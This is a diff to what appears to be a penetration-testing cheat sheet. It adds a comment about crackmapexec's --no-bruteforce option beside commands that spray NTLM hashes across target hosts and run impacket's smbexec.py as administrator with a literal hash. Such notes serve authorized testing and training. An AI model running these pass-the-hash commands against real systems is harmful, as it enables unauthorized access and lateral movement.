@@ -1808,6 +1808,7 @@ cme smb targets.txt -u users.txt -H hashes.txt --local-auth
 # with impacket
 smbexec.py -hashes :ee0c207898a5bccc01f38115019ca2fb administrator@10.11.1.24
 cme smb targets.txt -u users.txt -H hashes.txt
+# with crackmapexec, use --no-bruteforce to try pairs instead of cartesian product
 ```
 
 ### Hydra
